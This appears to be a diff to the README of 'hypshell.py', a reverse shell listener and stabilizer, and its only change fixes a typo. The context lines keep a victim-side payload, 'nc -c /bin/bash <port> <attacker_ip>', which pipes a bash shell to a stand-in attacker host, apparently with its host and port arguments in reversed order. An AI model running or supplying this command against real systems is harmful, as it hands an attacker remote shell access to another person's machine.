@@ -3,7 +3,7 @@ A simple reverse shell handler and stabilizer
 # Usage
 `usage: ./hypshell.py [options] port`
 
-You can run the script on the attacking machine to listen for incmoing connections.
+You can run the script on the attacking machine to listen for incoming connections.
 
 Run this payload exmaple on the victim to start a reverse shell:
 `nc -c /bin/bash <port> <attacker_ip>`
